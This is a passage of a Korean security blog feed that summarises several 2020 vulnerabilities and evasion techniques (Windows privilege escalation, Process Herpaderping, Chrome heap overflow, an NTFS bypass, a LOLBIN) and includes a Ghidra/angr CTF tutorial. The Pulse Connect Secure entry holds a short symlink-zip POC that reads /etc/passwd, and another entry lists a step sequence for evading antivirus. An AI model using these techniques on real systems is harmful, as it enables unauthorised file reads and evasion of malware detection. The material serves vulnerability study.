href="https://securitylab.github.com/advisories/GHSL-2020-040-chrome">https://securitylab.github.com/advisories/GHSL-2020-040-chrome</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>use after free</tag>
      
      <tag>L0ch</tag>
      
      <tag>chrome</tag>
      
      <tag>chromium</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16939: Windows Group Policy DACL overwrite를 이용한 권한 상승</title>
    <link href="/2020/10/29/idioth/2020-10-29/"/>
    <url>/2020/10/29/idioth/2020-10-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/10/27/cve-2020-16939-windows-group-policy-dacl-overwrite-privilege-escalation">CVE-2020-16939: WINDOWS GROUP POLICY DACL OVERWRITE PRIVILEGE ESCALATION</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>해당 취약점은 그룹 정책 업데이트 실행 중에 수행되는  <code>SetSecurityFile</code>을 악용하는 취약점입니다.</p><p><code>gpupdate /target:user /force</code> 실행 시 <code>SetSecurityFile</code>는 impersonation 없이 수행됩니다. 그룹 정책 업데이트가 실행된 후 <code>%programdata%\Microsoft\GroupPolicy\Users\&lt;SID&gt;</code>의 소유자는 Administrators가 되고 User 그룹은 읽기 및 실행 권한만 갖게 됩니다. 하지만 하위 디렉터리인 <code>\Datastore\0\sysvol</code>의 소유자는 User가 됩니다. 따라서 권한이 낮더라도 해당 폴더의 권한을 수정할 수 있습니다.</p><p><code>sysvol</code> 디렉터리 아래에 권한을 수정할 디렉터리의 Junction을 생성한 후 그룹 정책 업데이트를 실행합니다. 해당 폴더와 폴더 내의 파일들은 모두 DACL Write의 대상이 되며  DACL Write 중 에러가 발생하면 수정한 권한이 부여됩니다. 에러가 발생하게 하는 방법 중 하나는 DACL Write가 완료되기 전에 <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks">oplock</a>을 사용하여 juction을 삭제하는 것입니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>dacl</tag>
      
      <tag>group policy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Process Herpaderping</title>
    <link href="/2020/10/28/fabu1ous/2020-10-28/"/>
    <url>/2020/10/28/fabu1ous/2020-10-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://jxy-s.github.io/herpaderping/">Process Herpaderping</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><strong>OS</strong></p><ul><li>Windows 7 Enterprise x86</li><li>windows 10 Pro x64</li><li>Windows 10 Pro Insider Preview x64</li></ul><p><strong>Security Prodct</strong></p><ul><li>Windows Defender AntiMalware Client</li><li>Windows Defender Engine</li><li>Windows Defender Antivirus</li><li>Windows Defender Antispyware</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><code>Herpaderping</code>이라는 Detection Evasion 기술입니다. 디스크에 존재하는 실행파일을 Process object의 생성과 Initial Thread 삽입 과정 사이에서 수정하는 탐지 우회 방법이 존재합니다. 이를 방지하고자 파일에 write 작업이 있었는지 확인하는 <code>on-write scanning</code>이 도입됐습니다. 문제는 이 <code>on-write scanning</code>이 <code>IRP_MJ_CLEANUP</code>(== file handle close)이 발생하기 전까지 파일의 수정 여부를 검사하지 않는다는 겁니다. 따라서 아래와 같은 순서로 우회가 가능합니다.</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> CreateFile (File handle을 계속 열어놓는다.)<span class="hljs-number">2.</span> NtCreateSectioin<span class="hljs-number">3.</span> NtCreatePrcessex<span class="hljs-number">4.</span> 실행파일 수정<span class="hljs-number">5.</span> NtCreateThreadEx<span class="hljs-number">6.</span> CloseFile (IRP_MJ_ClEANUP)</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>detection evasion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Technical Advisory: Pulse Connect Secure – Arbitrary File Read via Logon Message</title>
    <link href="/2020/10/27/l0ch/10-27_1day1line/"/>
    <url>/2020/10/27/l0ch/10-27_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-arbitrary-file-read-via-logon-message-cve-2020-8255/">Technical Advisory: Pulse Connect Secure – Arbitrary File Read via Logon Message (CVE-2020-8255)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Pulse Connect Secure</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SSL VPN 서비스인 Pulse Connect Secure에서 로그온 메시지 구성 요소를 악용해 arbitrary file read가 가능한 취약점이 발견되었습니다.</p><p>관리자는 로그인 시 출력되는 메시지를 <code>/dana-admin/auth/signinNotf.cgi</code> 페이지를 통해 설정할 수 있는데, <code>en.txt</code> 및 <code>default.txt</code> 파일로 구성된 zip 형식의 파일을 업로드하면 해당 파일의 내용이 로그온 메시지로 표시됩니다.</p><p>이때 zip 파일에 포함된 파일의 심볼릭 링크 여부를 확인하지 않으며 read 할 파일을 심볼릭 링크로 설정하는 arbitrary file read가 가능합니다.</p><p>다음은 <code>/etc/passwd</code> 파일을 출력하는 POC입니다.</p><pre><code class="hljs gradle">ln -s <span class="hljs-regexp">/etc/</span>passwd <span class="hljs-keyword">default</span>.txtln -s <span class="hljs-regexp">/etc/</span>passwd en.txtzip --symlinks logon.zip <span class="hljs-keyword">default</span>.txt en.txtadding: <span class="hljs-keyword">default</span>.txt (stored <span class="hljs-number">0</span>%)adding: en.txt (stored <span class="hljs-number">0</span>%)</code></pre><p>위와 같이 파일에 심볼릭 링크를 설정해 zip으로 압축한 뒤 <code>/dana-admin/auth/signinNotf.cgi</code> 페이지에 업로드하면 로그온 페이지에 <code>/etc/passwd</code>의 내용이 표시됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-1034: Windows Kernel EoP</title>
    <link href="/2020/10/26/idioth/cve-2020-1034/"/>
    <url>/2020/10/26/idioth/cve-2020-1034/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.br0vvnn.io/pages/blogpost.aspx?id=2">Explicit Is Always Good? Read the Story of CVE-2020-1034</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 8</li><li>Windows 10</li><li>Windows Server 2012</li><li>Windows Server 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>지난 9월 커널 권한 상승 취약점에 대한 패치가 포함되었습니다. 해당 패치에 영향을 받는 모듈은 <code>ntoskrnl.exe</code>입니다.</p><p><code>EtwpNotifyGuid</code>에서 <code>cmp [rdi+0Ch], r12b</code>를 수행하는데 <code>r12b</code>의 초기화 값은 4이지만 1로 리셋이 됩니다. <code>byte ptr[rdi+0Ch]</code>가 1의 값과 같다면 <code>rdi+18h</code> 값은 새로 생성된 <code>UmReplyObject</code>의 주소로 설정됩니다. <code>twpQueueNotification</code>에서 <code>UmReplyObject</code>가 참조된 부분을 찾으면 <code>bl</code>의 값은 0이고 <code>rbp+0Ch</code>가 0이 아닐 시 <code>rbp+18h</code>는 객체의 포인터를 읽습니다. </p><p><code>rbp+0Ch</code>는  <code>EtwpNotifyGuid</code>에서는 1과 비교하여 <code>UmReplyObject</code>를 만들지 여부를 결정하지만 마지막 비교에서 0과 비교하여 일관성 없는 비교가 됩니다.</p><p>만약 비교한 값이 1이나 0이 아닐 경우 객체 주소가 임의의 값으로 사용되고 <code>ObfReferenceObject</code>가 호출되어 <code>ptr[[InputBuffer + 0x18]-0x30] ++</code>연산이 수행되어 임의 주소 증가가 이루어집니다. 따라서 Windows 10 RS4 이상의 커널에서 프로세스 토큰의 권한 필드를 조작할 수 있습니다. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>idioth</tag>
      
      <tag>ntoskrnl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] AngryGhidra를 사용해보자!</title>
    <link href="/2020/10/25/idioth/angryghidra/"/>
    <url>/2020/10/25/idioth/angryghidra/</url>
    
    <content type="html"><![CDATA[<p>하지메마시떼! 반갑습니다 오늘도 띨띨한 idioth입니다.</p><p>오늘 소개해드릴 툴은 AngryGhidra라는 툴입니다.</p><p>누군가(?)가 올려준 링크를 보고 오 이거 편하겠는데 한 번 써볼까? 하고 써봤다가 사용해볼 만한 가치가 있는 것 같아서 글을 작성해봅니다.</p><p><a href="https://github.com/angr/angr">angr</a>에 대해 설명해드리자면 바이너리 분석을 도와주는 python 라이브러리입니다.</p><p>기존 angr를 사용하려면 IDA와 같은 툴을 사용하여 분석하고 주소를 구하고 python 코드에다가 적고… 다시 구하고 코드에다가 적고 하는 노가다를 진행해야 했습니다. 하지만 이 녀석을 사용하면 Ghidra에서 분석하고 클릭질만 몇 번 하면 angr의 기능을 사용할 수 있습니다.</p><p>저녁 먹고 와서 공부도 하기 싫겠다… 요거나 세팅해서 써보면서 갖고 놀아봐야겠다… 히히히 하는 생각은 30분 만에 깨져버리게 됩니다.</p><h1 id="예상치-못한-삽질"><a href="#예상치-못한-삽질" class="headerlink" title="예상치 못한 삽질"></a>예상치 못한 삽질</h1><p>분명 Readme.md에서는 릴리즈 버전을 설치하여 Extension 추가하면 된다 했다.</p><p>→ 근데 왜 릴리즈 버전이 아무것도 없는 거지? 함정인가</p><p>그냥 git clone하면 빌드 된 파일이 있을 거라 생각하였으나 없었다.</p><p>→ clone하고 있는 파일들 전부다 Ghidra Extension에서 클릭해봤으나 오류만 엄청 뜸.. build.gradle 파일이 있으니 gradle로 빌드를 해보자</p><p>gradle을 통해 빌드를 하는데 정상적으로 되질 않네..?</p><p>→ 내가 뭘 하려 할 때마다 오류가 뜬다… 이쯤에서 멘탈이 나가서 혼자 모니터 앞에서 욕을 하기 시작</p><p>우여곡절 속에서 빌드 성공(!) 후 신나서 L0ch에게 야 빌드 했다 이제 돌려본다 옆에서 딱 기다려 ㅋㅋ하고 옆에 세워뒀습니다. 하지만 가져온 바이너리를 돌렸는데 angr가 돌아가지 않았다…</p><blockquote><p>L0ch 日 : 아니 형 된다면서 안되잖아 뭐야 빨리 다시 삽질해요</p></blockquote><p><del>나쁜넘</del> 아무튼 여기서 멈출 수 없으므로 angr를 재설치해보고 python 버전이 문젠가 삽질을 다시 시작합니다…</p><p>결국 멘탈이 박살 난 상태로 집에 가서 애니메이션(?)을 보며 힐링 후 다음 날 다시 도전을 해보았습니다.</p><p>UE(User Error)일 가능성이 크다고 생각하며 오늘의 나와 어제의 나는 다르기 때문에 또 돌렸는데 실행이 안 됐습니다.. 도대체 왜 안돼?라고 생각하는 찰나 내 머리에 스친 생각</p><blockquote><p>아니 이거 elf 파일인데 왜 windows에서 돌리고 있지??</p></blockquote><p align="center"><img src="./img1.jpg" width=60% height=60%></p><p>ubuntu로 옮긴 다음에 다시 위의 과정 반복 후 다시 L0ch를 불렀습니다. 이 자식은 형이 부르는데 맨날 투덜거려요. “안되기만 해 봐” 하면서 와놓고 되니까 따봉 날리고 갑니다.</p><p>현재는 Pre-release로 AngryGhidra v0.1이 업로드된 상태라서 귀찮으신 분은 <a href="https://github.com/Nalen98/AngryGhidra/releases">릴리즈 버전을 다운로드</a> 받아 Extension을 바로 추가하면 될 것 같습니다.</p><h1 id="근데-Ghidra가-뭔데"><a href="#근데-Ghidra가-뭔데" class="headerlink" title="근데 Ghidra가 뭔데?"></a>근데 Ghidra가 뭔데?</h1><p><a href="https://ghidra-sre.org/">Ghidra</a>는 NSA에서 개발한 역어셈블러 프레임워크입니다. 뭐 하는 녀석인지 잘 모르겠으면 IDA 같은 녀석이라고 보시면 됩니다.</p><p>오픈 소스로 공개되었으며 jdk 11 버전에서 정상적으로 작동됩니다.</p><p>다른 응용 프로그램들처럼 설치 파일을 통해 설치하는 것이 아닌 압축 파일을 다운 받아서 압축만 해제하면 바로 실행할 수 있습니다.</p><p>지원 플랫폼</p><ul><li>Windows 7 or 10 (64bit)</li><li>Linux (64bit, CentOs 7 is preferred)</li><li>macOS(OS X) 10.8.3+ (Mountain Lion or later)</li></ul><p>32비트 OS에서는 Ghidra를 사용할 수 없습니다.</p><h2 id="우분투에-Ghidra-설치하기"><a href="#우분투에-Ghidra-설치하기" class="headerlink" title="우분투에 Ghidra 설치하기"></a>우분투에 Ghidra 설치하기</h2><h3 id="자바-환경-설치"><a href="#자바-환경-설치" class="headerlink" title="자바 환경 설치"></a>자바 환경 설치</h3><pre><code class="hljs bash">$ sudo add-apt-repository ppa:openjdk-r/ppa$ sudo apt install openjdk-11-jre openjdk-11-jre-headless openjdk-11-jdk openjdk-11-jdk-headless</code></pre><h3 id="Ghidra-설치"><a href="#Ghidra-설치" class="headerlink" title="Ghidra 설치"></a>Ghidra 설치</h3><p><a href="https://ghidra-sre.org/">기드라 사이트</a>에서 최신 버전의 기드라를 설치해줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img2.png"></p><p>설치 후 원하는 폴더에서 압축을 해제하면 ghidra가 정상적으로 설치됩니다.</p><pre><code class="hljs bash">idioth@ubuntu:~$ ls -al ghidra_9.1.2_PUBLICtotal 56drwxr-xr-x  9 idioth idioth  4096  9월 11 15:15 .drwxr-xr-x 31 idioth idioth  4096  9월 14 17:01 ..drwxr-xr-x  5 idioth idioth  4096  2월 12  2020 docsdrwxr-xr-x  5 idioth idioth  4096  2월 12  2020 Extensionsdrwxr-xr-x  8 idioth idioth  4096  2월 12  2020 Ghidra-rwxr-xr-x  1 idioth idioth   883  2월 12  2020 ghidraRun-rw-r--r--  1 idioth idioth   384  2월 12  2020 ghidraRun.batdrwxr-xr-x  7 idioth idioth  4096  2월 12  2020 GPL-rw-r--r--  1 idioth idioth 11357  2월 12  2020 LICENSEdrwxr-xr-x  2 idioth idioth  4096  2월 12  2020 licensesdrwxr-xr-x  2 idioth idioth  4096  2월 12  2020 serverdrwxr-xr-x  2 idioth idioth  4096  2월 12  2020 support</code></pre><p>Windows의 경우 ghidraRun.bat를 통해 실행하고 우분투의 경우 ghidraRun을 통해 실행해 줍니다. 실행 권한이 없을 경우 chmod +x ghidraRun을 통해 실행 권한을 주면 됩니다.</p><h1 id="AngryGhidra"><a href="#AngryGhidra" class="headerlink" title="AngryGhidra"></a>AngryGhidra</h1><p>기드라가 정상적으로 설치되었다면 <a href="https://github.com/Nalen98/AngryGhidra/releases">AngryGhidra</a>를 설치해 줍니다.</p><h2 id="Angr-설치"><a href="#Angr-설치" class="headerlink" title="Angr 설치"></a>Angr 설치</h2><pre><code class="hljs bash">$ sudo pip3 install angr</code></pre><h2 id="Releases로-플러그인-등록"><a href="#Releases로-플러그인-등록" class="headerlink" title="Releases로 플러그인 등록"></a>Releases로 플러그인 등록</h2><p>pre-releases가 올라왔으니 저와 같은 시간 낭비(?)는 하지 말고 릴리즈 버전으로 등록을 해봅시다.</p><pre><code class="hljs bash">$ wget https://github.com/Nalen98/AngryGhidra/releases/download/0.1%2Bghidra-9.1.2/ghidra_9.1.2_PUBLIC_20200909_AngryGhidra.zip</code></pre><p>릴리즈 버전을 설치해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img3.png"></p><p>기드라 실행 후 File-Install Extensions을 선택해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img4.png"></p><p>우측 상단에 +버튼을 선택해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img5.png"></p><p>설치 받은 zip 파일을 선택해 준 후 체크해 줍니다.</p><p>그러면 끝납니다. 체크하고 OK 누르면 설치 완료~</p><h2 id="Gradle을-통해서-직접-빌드하는-방법"><a href="#Gradle을-통해서-직접-빌드하는-방법" class="headerlink" title="Gradle을 통해서 직접 빌드하는 방법"></a>Gradle을 통해서 직접 빌드하는 방법</h2><p>릴리즈 버전이 올라와 있기 때문에 굳이 이 방법을 택하시는 분이 없을 거라 생각하지만 혹시 본인이 직접 빌드 해보고 싶으시다면 직접 빌드 해보시는 것도 추천드립니다.</p><pre><code class="hljs bash">$ sudo apt install gradle$ git <span class="hljs-built_in">clone</span> https://github.com/Nalen98/AngryGhidra</code></pre><p>gradle을 통해서 빌드 하기 위해 gradle을 설치하고 AngryGhidra repository를 가져옵니다.</p><pre><code class="hljs bash">~/AngryGhidra$ gradle buildExtensionStarting a Gradle Daemon, 1 incompatible and 1 stopped Daemons could not be reused, use --status <span class="hljs-keyword">for</span> detailsFAILURE: Build failed with an exception.* Where:Build file <span class="hljs-string">&#x27;/home/idioth/AngryGhidra/build.gradle&#x27;</span> line: 31* What went wrong:A problem occurred evaluating root project <span class="hljs-string">&#x27;AngryGhidra&#x27;</span>.&gt; GHIDRA_INSTALL_DIR is not defined!* Try:Run with --stacktrace option to get the stack trace. Run with --info or --debug option to get more <span class="hljs-built_in">log</span> output. Run with --scan to get full insights.* Get more <span class="hljs-built_in">help</span> at https://help.gradle.orgBUILD FAILED <span class="hljs-keyword">in</span> 3s</code></pre><p>그냥 빌드를 진행할 경우 기드라의 설치 경로를 알 수 없기 때문에 정상적으로 빌드가 되지 않습니다. 좀 더 똑똑한(?) 제가 가르쳐주도록 합니다.</p><pre><code class="hljs bash">~/AngryGhidra$ sudo GHIDRA_INSTALL_DIR=/home/idioth/ghidra_9.1.2_PUBLIC gradle buildExtension&gt; Task :buildHelp INFO  Using <span class="hljs-built_in">log</span> config file: jar:file:/home/idioth/ghidra_9.1.2_PUBLIC/Ghidra/Framework/Generic/lib/Generic.jar!/generic.log4j.xml (LoggingInitialization)  INFO  Using <span class="hljs-built_in">log</span> file: /root/.ghidra/.ghidra_9.1.2_PUBLIC/application.log (LoggingInitialization)  [JavaHelpFilesBuilder] Generating Help Files <span class="hljs-keyword">for</span>: [file:///home/idioth/AngryGhidra/src/main/<span class="hljs-built_in">help</span>/<span class="hljs-built_in">help</span>/][JavaHelpFilesBuilder] Generating map file: file:///home/idioth/AngryGhidra/build/<span class="hljs-built_in">help</span>/main/<span class="hljs-built_in">help</span>/AngryGhidra_map.xml...[JavaHelpFilesBuilder]  finished generating map file[JavaHelpFilesBuilder] Generating TOC file: AngryGhidra_TOC.xml...[JavaHelpFilesBuilder]  finished generating TOC file[JavaHelpFilesBuilder] Done generating <span class="hljs-built_in">help</span> files <span class="hljs-keyword">for</span> module: AngryGhidra&gt; Task :buildExtension Created ghidra_9.1.2_PUBLIC_20200914_AngryGhidra.zip <span class="hljs-keyword">in</span> /home/idioth/AngryGhidra/distBUILD SUCCESSFUL <span class="hljs-keyword">in</span> 15s8 actionable tasks: 8 executed</code></pre><p>위와 같이 자신의 기드라 경로를 추가해 준 후 빌드를 진행합니다. </p><pre><code class="hljs bash">~/AngryGhidra/dist$ lsghidra_9.1.2_PUBLIC_20200914_AngryGhidra.zip</code></pre><p>정상적으로 빌드가 진행됐다면 dist 폴더에 Extension 파일이 생깁니다.</p><p>여기까지 오셨다면 릴리즈를 통해 추가하는 것과 같은 방법으로 추가하시면 됩니다!</p><h2 id="AngryGhidra를-통한-문제-풀이"><a href="#AngryGhidra를-통한-문제-풀이" class="headerlink" title="AngryGhidra를 통한 문제 풀이"></a>AngryGhidra를 통한 문제 풀이</h2><p>angr로 푸는 문제 중 가장 간단한(?) <a href="https://github.com/ByteBandits/writeups/blob/master/defcamp-quals-2015/reverse/r100/r100.bin">Defcamp - r100</a>을 통해서 어떤 식으로 사용하는지 확인해봅시다.</p><p>먼저 기드라로 해당 파일을 열어준 후 main 소스 코드를 확인해봅시다.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_004007e8</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> iVar1;<span class="hljs-keyword">char</span> *pcVar2;undefined8 uVar3;<span class="hljs-keyword">long</span> in_FS_OFFSET;<span class="hljs-keyword">char</span> local_118 [<span class="hljs-number">264</span>];<span class="hljs-keyword">long</span> local_10;local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the password: &quot;</span>);pcVar2 = fgets(local_118, <span class="hljs-number">0xff</span>, <span class="hljs-built_in">stdin</span>);<span class="hljs-keyword">if</span> (pcVar2 == (<span class="hljs-keyword">char</span> *)<span class="hljs-number">0x0</span>) &#123;uVar3 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;iVar1 = FUN_004006fd(local_118);<span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) &#123;put(<span class="hljs-string">&quot;Nice!&quot;</span>);uVar3 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Incorrect password!&quot;</span>);uVar3 = <span class="hljs-number">1</span>;&#125;&#125;<span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;__stack_chk_fail();&#125;<span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>password를 입력받고 <code>FUN_004006fd</code> 함수에서 어떠한 수행을 하고 return 값에 따라서 Nice와 incorrect로 넘어가네요.</p><p>Incorrect 부분을 피하고 Nice로 가는 패스워드를 찾아야 합니다.</p><p>저 함수를 일일이 분석하는 방법도 있지만 우리에게는 AngryGhidra가 있습니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img6.png"></p><p>먼저 함수의 시작 부분에서 blank state를 설정해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img7.png"></p><p>우리는 Nice 문자열 부분으로 넘어가는 값을 찾고 싶으니 Nice 쪽으로 넘어가는 주소를 Find Address로 설정해 줍니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img8.png"></p><p>Incorrect로 가는 부분은 피해야 되니 Avoid Address로 설정한 다음에 AngryGhidra를 실행해봅시다!</p><p><img src="/2020/10/25/idioth/angryghidra/img9.png"></p><p><img src="/2020/10/25/idioth/angryghidra/img10.png"></p><p>Window - AngryGhidraPlugin을 클릭하면 위의 사진과 같은 창이 뜹니다. 인자의 길이를 지정할 수도 있고, auto_load_libs를 설정할 수도 있습니다.</p><p>Blank State와 Find address, avoid address를 모두 설정하였으니 Run 버튼을 눌러 angr를 돌려봅시다.</p><p>잠시 기다려보면 Solution Found라고 뜨며 아래와 같이 어떤 문자열이 뜹니다.</p><p><img src="/2020/10/25/idioth/angryghidra/img11.png"></p><p>나온 문자열을 바이너리에 입력해보면</p><pre><code class="hljs bash">~/Desktop$ ./r100.bin Enter the password: Code_TalkersNice!</code></pre><p>정상적으로 찾은 것을 알 수 있습니다.</p><p>나는 소스 코드 보고 클릭질만 몇 번 하면 값을 찾아준다? 정말 인간의 욕구에 충실한 플러그인이 아닐 수가 없습니다.</p><p>직접 스크립트를 작성해서 돌리는 것이 기능적으로는 훨씬 효율적일 수 있지만 리버싱을 진행하면서 바로바로 angr 환경 세팅 및 실행할 수 있다는 점이 매력적이었습니다.</p><p>아직은 간단한 것들로만 해보고 더 복잡한 것들은 사용해보지 않았는데 나중에 기회가 된다면 더 복잡한 바이너리에 사용해보고 올려보도록 하겠습니다 ㅋㅋ</p><p>오늘도 저의 멍청함을 확인하고 극복한 나에게 건배하며.. adios..</p><p align="center"><img src="./img12.jpg" width="50%" heightd="50%"></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>angr</tag>
      
      <tag>ghidra</tag>
      
      <tag>angryghidra</tag>
      
      <tag>symbolic execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-15999: Chrome 0-day, Heap buffer overflow</title>
    <link href="/2020/10/24/fabu1ous/2020-10-24/"/>
    <url>/2020/10/24/fabu1ous/2020-10-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://savannah.nongnu.org/bugs/?59308">Heap buffer overflow due to integer truncation in Load_SBit_Png</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Google Chrome</p><p>Freetype</p><p>libpng</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2020-10-21일 Chrome 긴급 패치가 릴리즈 됐습니다. CVE-2020-15999는 Chrome에서 폰트를 렌더링 할 때 사용하는 오픈소스 라이브러리 Freetype와 공식 PNG 라이브러리 libpng 사이에서 발생하는 이슈입니다. 각 라이브러리는 이미지로부터 32-bit integer크기의 width와 height값을 참조해 동작하는데, Freetype은 16-bit로 truncate(축소)한 뒤 bitmap 할당에 사용되는 size를 계산합니다. 이미지의 width와 height가 16-bit 보다 크다면 Freetype에서 할당된 bitmap이 실제 이미지보다 작겠죠? 이  bitmap을 libpng가 사용하면서 heap buffer overflow가 발생하게 됩니다. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>heap bof</tag>
      
      <tag>png</tag>
      
      <tag>freetype</tag>
      
      <tag>libpng</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Bypassing NTFS permissions to read any files as unprivileged user</title>
    <link href="/2020/10/23/l0ch/10-23_1day1line/"/>
    <url>/2020/10/23/l0ch/10-23_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/ioncodes/CVE-2020-16938">POC using Windows API calls</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 2004/Server 2004</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>권한이 없는 일반 사용자가 로컬 드라이브의 전체 데이터를 열람할 수 있는 취약점의 POC가 공개되었습니다.<br>해당 취약점은 최근 업데이트로 파티션, 볼륨 장치에 대한 권한이 변경되어 <code>\\.\PhysicalDrive0\</code>경로로 장치에 접근하면 권한을 우회해 arbitrary file read가 가능합니다. </p><p><img src="/2020/10/23/l0ch/10-23_1day1line/image1.png" alt="image1"></p><p>NTFS parser인 7zip으로도 arbitrary file read 가 가능합니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://twitter.com/jonasLyk/status/1316104870987010048">https://twitter.com/jonasLyk/status/1316104870987010048</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
      <tag>ntfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] GfxDownloadWrapper.exe LOLBIN을 이용한 Assembly Loading</title>
    <link href="/2020/10/22/idioth/gfxdownloadwrapper/"/>
    <url>/2020/10/22/idioth/gfxdownloadwrapper/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bohops.com/2020/10/21/exploring-an-assembly-loading-technique-and-detection-mechanism-for-the-gfxdownloadwrapper-exe-lolbin/">Exploring an Assembly Loading Technique and Detection Mechanism for the GfxDownloadWrapper.exe LOLBIN</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>GfxDownloadWrapper.exe는 인텔 비디오 카드 드라이버 소프트웨어로 인텔 그래픽 컨트롤 패널 및 게임 그래픽 설정을 지원하는 .NET 응용 프로그램입니다. 해당 파일은 “Microsoft Windows Third Party Component CA 2012”로 인증되어 있습니다. GfxDownloadWrapper.exe는 임의 다운로드를 방지하기 위한 루틴이 존재하지만 낮은 버전에서는 그러한 검증이 없습니다.</p><p><code>main()</code> 진입점에서 어셈블리를 로드하는 부분을 발견할 수 있으며 인자를 조작함으로써 영향을 미칠 수 있습니다.</p><ul><li>args[0]: “run”의 문자열 값</li><li>args[1]: 어셈블리 DLL 페이로드 경로</li><li>args[2]: 필수 어셈블리 method 숫자 문자열 값<ul><li>0: <code>ApplyRecommendedSettings</code>, 1: <code>RestoreRecommendedSettings</code>, 2: <code>CacheCleanup</code></li></ul></li><li>args[3]: 